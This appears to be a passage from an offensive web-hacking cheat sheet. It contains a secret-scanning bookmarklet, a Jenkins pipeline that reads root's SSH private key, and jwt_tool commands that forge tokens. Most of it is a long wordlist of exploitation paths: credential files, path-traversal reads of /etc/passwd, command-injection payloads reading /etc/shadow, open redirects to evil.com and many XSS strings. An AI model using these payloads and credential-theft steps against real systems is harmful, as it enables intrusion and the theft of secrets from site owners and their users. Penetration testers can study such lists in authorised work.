javascript:(function(){var scripts=document.getElementsByTagName("script");const patterns={credentials:/pass(word|wd|phrase)|secret|token|api[-_]?key|auth|credential|private[-_]key/gi,jwt:/(eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,})/g,ips:/(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/g,awsKeys:/(AKIA|ASIA)[A-Z0-9]{16}/g,emails:/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi,urlSecrets:/(https?:\/\/[^:\/]+:[^@\/]+@)/g};const results={};function scanText(t,loc){Object.entries(patterns).forEach(([name,regex])=>{let m;while((m=regex.exec(t))!==null){if(!results[loc])results[loc]=[];if(results[loc].indexOf(m[0])===-1)results[loc].push(m[0])}})}for(let i=0;i<scripts.length;i++){let s=scripts[i];if(s.src){fetch(s.src).then(r=>r.text()).then(t=>{scanText(t,s.src)}).catch(e=>console.error(e));if(s.textContent.trim()!=="")scanText(s.textContent,s.src+" (inline fallback)") } else {scanText(s.textContent,"inline script #"+(i+1))}};scanText(document.body.innerHTML,document.location.href);function showResults(){let total=0;Object.values(results).forEach(arr=>{total+=arr.length});document.write('<h3>Found '+total+' potential secret(s) across '+Object.keys(results).length+' location(s):</h3>');Object.entries(results).forEach(([loc,secrets])=>{document.write('<h4>Location: <code>'+loc+'</code></h4>');secrets.forEach(sec=>{document.write('<code>'+sec+'</code><br>')})})}setTimeout(showResults,5000)})();
```

## Jenkins

### Read SSH Keys through Pipelines

The following example the `SSH Agent Plugin` enabled.

```console
pipeline {
    agent any
    
    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@<RHOST> "cat /root/.ssh/id_rsa"'
                    }
                }
            }
        }
    }
}
```

## jsleak

```console
$ echo http://<DOMAIN>/ | jsleak -s          // Secret Finder
$ echo http://<DOMAIN>/ | jsleak -l          // Link Finder
$ echo http://<DOMAIN>/ | jsleak -e          // Complete URL
$ echo http://<DOMAIN>/ | jsleak -c 20 -k    // Check Status
$ cat <FILE>.txt | jsleak -l -s -c 30        // Read from File
```

## JWT_Tool

> https://github.com/ticarpi/jwt_tool

```console
$ python3 jwt_tool.py -b -S hs256 -p 'secretlhfIH&FY*#oysuflkhskjfhefesf' $(echo -n '{"alg":"HS256","typ":"JWT"}' | base64).$(echo -n '{"name": "1", "exp":' `date -d "+7 days" +%s`} | base64 -w0).
$ python3 jwt_tool.py -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyOWVmOTYzOTMwYjA0NzYzZmU2YzMiLCJuYW1lIjoiZm9vYmFyIiwiZW1haWwiOiJmb29iYXJAc2VjcmV0LmNvbSIsImlhdCI6MTYzNTk1MDQxOX0.nhsLKCvNPBU8EoYVwDDpo8wGrL9VV62vrHVxfsBPCRk
```

## Kiterunner

> https://github.com/assetnote/kiterunner

```console
$ kr wordlist list
$ kr scan http://<RHOST> -A <WORDLIST>
$ kr scan http://<RHOST> -A <WORDLIST> --ignore-length 24
```

## kxss

> https://github.com/Emoe/kxss

```console
$ go install github.com/Emoe/kxss@latest
```

## Kyubi

> https://github.com/shibli2700/Kyubi

```console
$ kyubi -v <URL>
```

## Leaky Paths

```console
.aws/config
.aws/credentials
.aws/credentials.gpg
.boto
.config/filezilla/filezilla.xml
.config/filezilla/recentservers.xml
.config/gcloud/access_tokens.db
.config/gcloud/credentials.db
.config/hexchat
.config/monero-project/monero-core.conf
.davfs2
.docker/ca.pem
.docker/config.json
.git-credentials
.gitconfig
.netrc
.passwd-s3fs
.purple/accounts.xml
.s3cfg
.s3ql/authinfo2
.shodan/api_key
.ssh/authorized_keys
.ssh/authorized_keys2
.ssh/config
.ssh/id_rsa
.ssh/id_rsa.pub
.ssh/known_hosts
/+CSCOE+/logon.html
/+CSCOT+/oem
/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
/+CSCOT+/translation
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development
/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5cetc/passwd
/..%5c..%5cetc/passwd
/..%5cetc/passwd
/..;/examples/jsp/index.html
/..;/examples/servlets/index.html
/..;/examples/websocket/index.xhtml
/..;/manager/html
/./../../../../../../../../../../etc/passwd
/.appveyor.yml
/.axiom/accounts/do.json
/.azure-pipelines.yml
/.build.sh
/.bzr/branch/branch.conf
/.chef/config.rb
/.circleci/config.yml
/.circleci/ssh-config
/.config.php
/.composer-auth.json
/.composer/composer.json
/.config/gcloud/access_tokens.db
/.config/gcloud/configurations/config_default
/.config/gcloud/credentials.db
/.config/karma.conf.js
/.dbeaver/credentials-config.json
/.docker/config.json
/.dockercfg
/.dockerfile
/.Dockerfile
/.drone.yml
/.DS_Store
/.editorconfig
/.env
/.env.backup
/.env.dev
/.env.dev.local
/.env.development.local
/.env.example
/.env.live
/.env.local
/.env.old
/.env.prod
/.env.prod.local
/.env.production
/.env.production.local
/.env.save
/.env.stage
/.env.www
/.env_1
/.env_sample
/.esmtprc
/.ftpconfig
/.git
/.git-credentials
/.git/config
/.git/head
/.git/logs/HEAD
/.git/refs/heads
/.github/workflows/automerge.yml
/.github/workflows/build.yaml
/.github/workflows/build.yml
/.github/workflows/ci-daily.yml
/.github/workflows/ci-generated.yml
/.github/workflows/ci-issues.yml
/.github/workflows/ci-push.yml
/.github/workflows/ci.yaml
/.github/workflows/ci.yml
/.github/workflows/CI.yml
/.github/workflows/coverage.yml
/.github/workflows/dependabot.yml
/.github/workflows/deploy.yml
/.github/workflows/docker.yml
/.github/workflows/lint.yml
/.github/workflows/main.yaml
/.github/workflows/main.yml
/.github/workflows/pr.yml
/.github/workflows/publish.yml
/.github/workflows/push.yml
/.github/workflows/release.yaml
/.github/workflows/release.yml
/.github/workflows/smoosh-status.yml
/.github/workflows/snyk.yml
/.github/workflows/test.yaml
/.github/workflows/test.yml
/.github/workflows/tests.yaml
/.github/workflows/tests.yml
/.gitignore
/.hg/hgrc
/.htaccess
/.htpasswd
/.idea/dataSources.xml
/.idea/deployment.xml
/.idea/httpRequests/http-client.cookies
/.idea/httpRequests/http-requests-log.http
/.idea/workspace.xml
/.jenkins.sh
/.mailmap
/.msmtprc
/.netrc
/.npm/anonymous-cli-metrics.json
/.phpunit.result.cache
/.redmine
/.redmine-cli
/.settings/rules.json?auth=FIREBASE_SECRET
/.snyk
/.ssh/authorized_keys
/.ssh/id_dsa
/.ssh/id_rsa
/.ssh/known_hosts
/.ssh/known_hosts.old
/.styleci.yml
/.svn
/.svn/entries
/.svn/prop
/.svn/text
/.travis.sh
/.tugboat
/.user.ini
/.vscode/
/.well
/.well-known/matrix/client
/.well-known/matrix/server
/.well-known/openid-configuration
/.wget-hsts
/.wgetrc
/.wp-config.php.swp
/////evil.com
////../../data/config/microsrv.cfg
///evil.com/%2F..
//admin/
//anything/admin/
//evil.com/%2F..
//evil.com/..;/css
//secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
/1.sql
/404.php.bak
/?view=log
/?wsdl
/_/.ssh/authorized_keys
/___graphql
/__clockwork/app
/__swagger__/
/Cassini.exe.config
/ccnet.config
/_cat/health
/_cat/indices
/_cluster/health
/_config.yml
/_darcs/prefs/binaries
/_debug_toolbar/
/_debugbar/open?max=20&offset=0
/_netrc
/_notes/dwsync.xml
/_profiler/empty/search/results?limit=10
/_profiler/phpinfo
/_profiler/phpinfo.php
/_something_.cfm
/_swagger_/
/_vti_bin/Authentication.asmx?op=Mode
/_vti_bin/lists.asmx?WSDL
/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
/abs/
/access.log
/access/config
/access_tokens.db
/actions/seomatic/meta
/actuator
/actuator/auditevents
/actuator/auditLog
/actuator/beans
/actuator/caches
/actuator/conditions
/actuator/configprops
/actuator/configurationMetadata
/actuator/dump
/actuator/env
/actuator/events
/actuator/exportRegisteredServices
/actuator/favicon.ico
/actuator/features
/actuator/flyway
/actuator/healthcheck
/actuator/heapdump
/actuator/httptrace
/actuator/hystrix.stream
/actuator/integrationgraph
/actuator/jolokia
/actuator/liquibase
/actuator/logfile
/actuator/loggers
/actuator/loggingConfig
/actuator/management
/actuator/mappings
/actuator/metrics
/actuator/refresh
/actuator/registeredServices
/actuator/releaseAttributes
/actuator/resolveAttributes
/actuator/scheduledtasks
/actuator/sessions
/actuator/shutdown
/actuator/springWebflow
/actuator/sso
/actuator/ssoSessions
/actuator/statistics
/actuator/status
/actuator/threaddump
/actuator/trace
/actuators/
/actuators/dump
/actuators/env
/actuators/health
/actuators/logfile
/actuators/mappings
/actuators/shutdown
/actuators/trace
/adfs/ls/idpinitiatedsignon.aspx
/adfs/services/trust/2005/windowstransport
/adjuncts/3a890183/
/admin
/admin../admin
/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s
/admin/
/Admin/
/admin/../admin
/admin//phpmyadmin/
/admin/adminer.php
/admin/config.php
/admin/configs/application.ini
/admin/data/autosuggest
/admin/error.log
/admin/errors.log
/admin/heapdump
/admin/index.php
/admin/init
/admin/log/error.log
/admin/login
/admin/login.html
/admin/login/?next=/admin/
/admin/logs/error.log
/admin/logs/errors.log
/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
/Admin/ServerSide/Telerik.Web.UI.DialogHandler.aspx?dp=1
/admin/views/ajax/autocomplete/user/a
/admin;/
/Admin;/
/adminadminer.php
/adminer.php
/adminer/
/adminer/adminer.php
/adminer/index.php
/administrator/webconfig.txt.php
/ADSearch.cc?methodToCall=search
/aims/ps/
/airflow.cfg
/AirWatch/Login
/alps/profile
/altair
/analytics/saw.dll?bieehome&startPage=1#grabautologincookies
/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
/anchor/errors.log
/android/app/google-services.json
/anonymous-cli-metrics.json
/ansible.cfg
/anything_here
/apache
/apache.conf
/apc.php
/apc/apc.php
/api
/api-docs
/api-docs/swagger.json
/api-docs/swagger.yaml
/api/
/api/.env
/api/__swagger__/
/api/_swagger_/
/api/api
/api/api-browser/
/api/api-docs
/api/api-docs/swagger.json
/api/api-docs/swagger.yaml
/api/apidocs
/api/apidocs/swagger.json
/api/apidocs/swagger.yaml
/api/application.wadl
/api/batch
/api/cask/graphql
/api/cask/graphql-playground
/api/config
/api/docs
/api/docs/
/api/graphql
/api/graphql/v1
/api/index.html
/api/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html
/api/jsonws
/api/jsonws/invoke
/api/profile
/api/proxy
/api/snapshots
/api/spec/swagger.json
/api/spec/swagger.yaml
/api/swagger
/api/swagger-resources
/api/swagger-resources/restservices/v2/api-docs
/api/swagger-ui.html
/api/swagger-ui/api-docs
/api/swagger-ui/swagger.json
/api/swagger-ui/swagger.yaml
/api/swagger.json
/api/swagger.yaml
/api/swagger.yml
/api/swagger/index.html
/api/swagger/static/index.html
/api/swagger/swagger
/api/swagger/swagger-ui.html
/api/swagger/ui/index
/api/swagger_doc.json
/api/timelion/run
/api/v1
/api/v1/
/api/v1/application.wadl
/api/v1/canal/config/1/1
/api/v1/namespaces
/api/v1/namespaces/default/pods
/api/v1/namespaces/default/secrets
/api/v1/namespaces/default/services
/api/v1/nodes
/api/v1/swagger-ui/swagger.json
/api/v1/swagger-ui/swagger.yaml
/api/v1/swagger.json
/api/v1/swagger.yaml
/api/v2
/api/v2/application.wadl
/api/v2/swagger.json
/api/v2/swagger.yaml
/api/vendor/phpunit/phpunit/phpunit
/api/whoami
/api_docs
/api_smartapp/storage/
/apis
/apis/apps/v1/namespaces/default/deployments
/aplicacao/application/configs/application.ini
/app.config
/app/config/parameters.yml
/app/config/parameters.yml.dist
/app/config/pimcore/google-api-private-key.json
/app/config/security.yml
/app/etc/local.xml
/app/google-services.json
/app/kibana/
/app/settings.py
/App_Master/Telerik.Web.UI.DialogHandler.aspx?dp=1
/application.ini
/application.wadl
/application.wadl?detail=true
/application/configs/application.ini
/application/logs/access.log
/application/logs/application.log
/application/logs/default.log
/apps/vendor/phpunit/phpunit/phpunit
/appsettings.json
/appspec.yaml
/appspec.yml
/appveyor.yml
/asdf.php
/AsiCommon/Controls/ContentManagement/ContentDesigner/Telerik.Web.UI.DialogHandler.aspx?dp=1
/assets../.git/config
/assets/.gitignore
/assets/config.rb
/assets/credentials.json
/assets/file
/assets/other/service-account-credentials.json
/asynchPeople/
/audit.config
/auditevents
/aura
/auth.html
/auth/login
/auth/realms/master/.well-known/openid-configuration
/authorization.do
/autoconfig
/autodiscover/
/autoupdate/
/aws.sh
/awstats.conf
/awstats.pl
/awstats/
/axis/
/axis/happyaxis.jsp
/axis2-web/HappyAxis.jsp
/axis2/
/axis2/axis2-web/HappyAxis.jsp
/azure-pipelines.yml
/backend
/backup
/backup.sh
/backup.sql
/backup/vendor/phpunit/phpunit/phpunit
/base/static/c
/beans
/BitKeeper/etc/config
/blog/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
/blog/phpmyadmin/
/bower.json
/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB
/bugs/verify.php?confirm_hash=&id=1
/build.sh
/bundles/kibana.style.css
/bundles/login.bundle.js
/cacti/
/certenroll/
/certprov/
/certsrv/
/cfcache.map
/CFIDE/administrator/images/background.jpg
/cfide/administrator/images/background.jpg
/CFIDE/administrator/images/componentutilslogin.jpg
/cfide/administrator/images/componentutilslogin.jpg
/CFIDE/administrator/images/mx_login.gif
/cfide/administrator/images/mx_login.gif
/cgi
/cgi-bin/config.exp
/cgi-bin/nagios3/status.cgi
/cgi-bin/nagios4/status.cgi
/cgi-bin/printenv.pl
/cgi-bin/upload/web-ftp.cgi
/CGI/Java/Serviceability?adapter=device.statistics.configuration
/CgiStart?page=Single
/CHANGELOG.md
/ckeditor/samples/
/client_secrets.json
/cloud-config.yml
/cloudexp/application/configs/application.ini
/cloudfoundryapplication
/cluster/cluster
/cms/application/configs/application.ini
/cms/portlets/Telerik.Web.UI.DialogHandler.aspx?dp=1
/cobbler_api
/common/admin/Calendar/Telerik.Web.UI.DialogHandler.aspx?dp=1
/common/admin/Jobs2/Telerik.Web.UI.DialogHandler.aspx?dp=1
/common/admin/PhotoGallery2/Telerik.Web.UI.DialogHandler.aspx?dp=1
/compile.sh
/composer.json
/composer.lock
/conf/
/config.js
/config.php.bak
/config.rb
/config.sh
/config
/config.inc
/config.inc.php
/config/
/config/application.rb
/config/configuration.yml
/config/database.yml
/config/databases.yml
/config/environment.rb
/config/error_log
/config/initializers/secret_token.rb
/config/jwt/private.pem
/config/packages/security.yaml
/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E
/config/properties.ini
/config/secrets.yml
/config/security.yml
/config/settings.yml
/config/storage.yml
/config/user.xml
/configprops
/configuration.php-dist
/configuration.yml
/configurations/config_default
/configure/app/landing/welcome-srm-va.html
/confluence
/conceptual.config
/conn.php.bak
/console
/console/login/LoginForm.jsp
/contact.php?theme=tes%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
/content../.git/config
/context.json
/control/login
/control/stream?contentId=<svg/onload=alert(1)>
/controller/config
/controller/registry
/controller/registry-clients
/core-cloud-config.yml
/core/config/databases.yml
/counters
/cp/Shares?user=&protocol=webaccess&v=2.3
/credentials.db
/credentials.json
/crossdomain.xml
/crowd/console/login.action
/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
/crx/de/index.jsp
/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(
/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(
/css../.git/config
/CTCWebService/CTCWebServiceBean
/CTCWebService/CTCWebServiceBean?wsdl
/darkstat/
/dasbhoard/
/dashboard/
/dashboard/phpinfo.php
/dashboard/UserControl/CMS/Page/Telerik.Web.UI.DialogHandler.aspx/Desktopmodules/Admin/dnnWerk.Users/DialogHandler.aspx?dp=1
/data.sql
/data/adminer.php
/data/autosuggest
/data?get=prodServerGen
/database.php.bak
/database.sql
/database/schema.rb
/db.php.bak
/db.sql
/db/robomongo.json
/db/schema.rb
/db_backup.sql
/db_config.php.bak
/dbaas_monitor/login
/dbdump.sql
/debug
/debug.cgi
/debug.seam
/debug/default/view
/debug/default/view.html
/debug/pprof/
/debug/vars
/default.php.bak
/demo
/deploy.sh
/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample
/desktop.ini
/DesktopModule/UIQuestionControls/UIAskQuestion/Telerik.Web.UI.DialogHandler.aspx?dp=1
/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx?dp=1
/desktopmodules/dnnwerk.radeditorprovider/dialoghandler.aspx?dp=1
/desktopmodules/telerikwebui/radeditorprovider/telerik.web.ui.dialoghandler.aspx?dp=1
/DesktopModules/TNComments/Telerik.Web.UI.DialogHandler.aspx?dp=1
/dev2local.sh
/development.log
/dfshealth.html
/dialin/
/dispatcher/invalidate.cache
/django/settings.py
/doc/page/login.asp
/doc/script/common.js
/docker-cloud.yml
/docker-compose-dev.yml
/docker-compose.dev.yml
/docker-compose.override.yml
/docker-compose.prod.yml
/docker-compose.production.yml
/docker-compose.staging.yml
/docker-compose.yml
/Dockerrun.aws.json
/docs
/docs/swagger.json
/domcfg.nsf
/download
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/index.html
/druid/indexer/v1/taskStatus
/dump
/dump.sql
/dwr/index.html
/eam/vib?id=/etc/issue
/ecp/
/editor/ckeditor/samples/
/elfinder.html
/elmah.axd
/elocker_old/storage/
/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E
/emergency.php
/env
/env.dev.js
/env.development.js
/env.js
/env.prod.js
/env.production.js
/env.sh
/env.test.js
/environment.rb
/equipbid/storage/
/error
/error.log
/error.txt
/error/error.log
/error_log
/error_log.txt
/errors.log
/errors.txt
/errors/errors.log
/errors_log
/etc
/etc/
/events../.git/config
/evil%E3%80%82com
/evil.com/
/evil.com//
/ews/
/examples/jsp/index.html
/examples/jsp/snp/snoop.jsp
/examples/servlets/index.html
/examples/websocket/index.xhtml
/exchange/
/exchweb/
/explore
/explorer
/express
/express-graphql
/extdirect
/favicon.ico
/fckeditor/_samples/default.html
/fetch
/filemanager/upload.php
/filezilla.xml
/FileZilla.xml
/filter/jmol/iframe.php?_USE=%22};alert(1337);//
/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file
/final/
/flow/registries
/footer.php.bak
/forum/phpmyadmin/
/frontend/web/debug/default/view
/ftpsync.settings
/fw.login.php
/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
/gallery/zp
/Gemfile
/Gemfile.lock
/getcfg.php
/getFavicon?host=burpcollaborator.net
/global
/glpi/status.php
/glpi2/status.php
/google-api-private-key.json
/google-services.json
/gotoURL.asp?url=google.com&id=43569
/graph
/graph_cms
/graphiql
/graphiql.css
/graphiql.js
/graphiql.min.css
/graphiql.min.js
/graphiql.php
/graphiql/finland
/graphql
/graphql-console
/graphql-devtools
/graphql-explorer
/graphql-playground
/graphql-playground-html
/graphql.php
/graphql/console
/graphql/graphql
/graphql/graphql-playground
/graphql/schema.json
/graphql/schema.xml
/graphql/schema.yaml
/graphql/v1
/groovyconsole
/groupexpansion/
/Gruntfile.coffee
/Gruntfile.js
/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E
/happyaxis.jsp
/header.php.bak
/health
/healthz
/heapdump
/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E
/home.html
/homepage.nsf
/hopfully404
/host.key
/hosts
/hsqldb%0a
/httpd.conf
/hybridconfig/
/HyperGraphQL
/hystrix.stream
/i.php
/id_dsa
/id_rsa
/IdentityGuardSelfService/
/IdentityGuardSelfService/images/favicon.ico
/images../.git/config
/images/favicon.ico
/img../.git/config
/IMS
/includes/.gitignore
/index.htm
/index.html
/index.jsp
/index.php
/index.php.bak
/index.php/admin/
/index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
/index.php?r=students/guardians/create&id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
/index.php?redirect=//evil.com
/index.php?redirect=/\/evil.com/
/INF/maven/com.atlassian.jira/atlassian
/info.php
/info/
/infophp.php
/infos.php
/init.sh
/inormalydonotexist
/iNotes/Forms5.nsf
/iNotes/Forms6.nsf
/iNotes/Forms7.nsf
/iNotes/Forms8.nsf
/iNotes/Forms85.nsf
/iNotes/Forms9.nsf
/install
/install.php?profile=default
/install.sh
/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23
/installer
/intikal/storage/
/invoker/EJBInvokerServlet/
/invoker/JMXInvokerServlet
/invoker/JMXInvokerServlet/
/ioncube/loader-wizard.php
/ipython/tree
/irj/portal
/iwc/idcStateError.iwc?page=javascript%3aalert(document.domain)%2f%2f
/jasperserver/login.html?error=1
/je/graphql
/jeecg-boot/
/jenkins/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample
/jenkins/script
/jira/secure/Dashboard.jspa
/jkstatus
/jkstatus/
/jkstatus;
/jmx
/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
/jolokia
/jolokia/exec/ch.qos.logback.classic
/jolokia/list
/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html
/jolokia/version
/josso/%5C../invoker/EJBInvokerServlet/
/josso/%5C../invoker/JMXInvokerServlet/
/js../.git/config
/js/elfinder.min.js
/js/elFinder.version.js
/jsapi_ticket.json
/jsonapi/user/user
/jsp/help
/jwt/private.pem
/karma.conf.js
/key.pem
/keycloak.json
/kustomization.yml
/laravel
/laravel-graphql-playground
/lfm.php
/lib../.git/config
/lib/phpunit/phpunit/phpunit
/libraries/joomla/database/
/libs/granite/core/content/login/favicon.ico
/LICENSE.txt
/linusadmin-phpinfo.php
/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;
/loader-wizard.php
/loadtextfile.htm#programinfo
/local2dev.sh
/local2prod.sh
/localhost.key
/localhost.sql
/log.log
/log.txt
/log/access.log
/log/debug.log
/log/development.log
/log/error.log
/log/errors.log
/log/firewall.log
/log/mobile.log
/log/production.log
/log/system.log
/log/vpn.log
/log/warn.log
/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E
/logfile
/loggers
/login
/login.jsp
/login.php
/login.php.bak
/Login?!><sVg/OnLoAD=alert`1337`//
/login?next=%2F
/logon/LogonPoint/custom.html
/logon/LogonPoint/index.html
/logs.txt
/logs/access.log
/logs/awstats.pl
/logs/development.log
/logs/error.log
/logs/errors.log
/logs/production.log
/lol/graphql
/magmi/web/js/magmi_utils.js
/mailsms/s?func=ADMIN:appState&dumpConfig=/
/main.php.bak
/management
/manager/html
/mantis/verify.php?id=1&confirm_hash=
/mantisBT/verify.php?id=1&confirm_hash=
/mappings
/mcx/
/mcx/mcxservice.svc
/meaweb/os/mxperson
/media../.git/config
/meet/
/meeting/
/message?title=x&msg=%26%23<svg/onload=alert(1337)>
/metrics
/mgmt/tm/sys/management
/mgmt/tm/sys/management-ip
/microsoft
/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https
/mifs/c/d/android.html
/mifs/login.jsp
/mifs/user/login.jsp
/mobile/error
/Modules/CMS/Telerik.Web.UI.DialogHandler.aspx?dp=1
/modules/system/assets/js/framework.combined-min.js
/modules/vendor/phpunit/phpunit/phpunit
/moto/application/configs/application.ini
/mrtg/
/MRTG/
/my.key
/my.ppk
/MyErrors.log
/mysql.initial.sql
/mysql.sql
/mysqlbackup.sh
/mysqldump.sql
/nagios/cgi-bin/status.cgi
/names.nsf/People?OpenView
/nbproject/project.properties
/nextcloud/index.php/login
/nginx.conf
/nginx_status
/NHibernate.Caches.SysCache.Tests.dll.config
/NHibernate.config
/NLog.config
/ngrok2/ngrok.yml
/nifi-api/access/config
/node/1?_format=hal_json
/npm-debug.log
/npm-shrinkwrap.json
/nunit-agent.exe.config
/nunit-gui.exe.config
/nunit-x86.exe.config
/nunit.exe.config
/nuxeo/login.jsp/pwn${31333333330+7}.xhtml
/OA_HTML/bin/sqlnet.log
/OA_HTML/jtfwrepo.xml
/oab/
/oauth-credentials.json
/oauth/token
/occ/v2/d2OzBcy
/ocsp/
/old/vendor/phpunit/phpunit/phpunit
/old_phpinfo.php
/oldsite/vendor/phpunit/phpunit/phpunit
/opcache
/opcache-status/
/opcache-status/opcache.php
/openapi.json
/Orion/Login.aspx
/os/mxperson
/ovirt-engine/
/owa/
/owa/auth/logon.aspx
/owncloud/config/
/package
/package-lock.json
/package.json
/pages
/pages/includes/status
/parameters.yml
/parameters.yml.dist
/Partners/application/configs/application.ini
/pdb/meta/v1/version
/PDC/ajaxreq.php?PARAM=127.0.0.1+
/perl
/perl-status
/persistentchat/
/phoneconferencing/
/php
/php-fpm.conf
/php-info.php
/php-opcache-status/
/php.ini
/php.php
/php/adminer.php
/php/phpmyadmin/
/php_info.php
/phpinfo.php
/phpmyadmin/
/phppgadmin/intro.php
/phpstan.neon
/phpunit.xml
/phpversion.php
/pimcore/app/config/pimcore/google-api-private-key.json
/pinfo.php
/playground
/plesk-stat/
/plugin/build
/plugins/servlet/gadgets/makeRequest?url=https
/plugins/servlet/gadgets/makeRequest?url=https://google.com
/plugins/servlet/oauth/users/icon
/plugins/servlet/svnwebclient/changedResource.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
/plugins/servlet/svnwebclient/commitGraph.jsp?%27)%3Balert(%22XSS
/plugins/servlet/svnwebclient/commitGraph.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
/plugins/servlet/svnwebclient/error.jsp?errormessage=%27%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&description=test
/plugins/servlet/svnwebclient/statsItem.jsp?url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
/PMUser/
/pods
/pools/default/buckets
/portal
/portal-graphql
/portal/favicon.ico
/portal/images/MyVue/MyVueHelp.png
/powershell/
/pprof
/private
/private-key
/private.pem
/privatekey.key
/prod2local.sh
/production.log
/profile
/proftpd.conf
/properties.ini
/provider.tf
/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx?dp=1
/proxy
/proxy.stream?origin=http
/PRTG/index.htm
/prtg/index.htm
/prweb/PRRestService/unauthenticatedAPI/v1/docs
/public/
/public/adminer.php
/public/config.js
/public/plugins/alertGroups/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/alertmanager/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
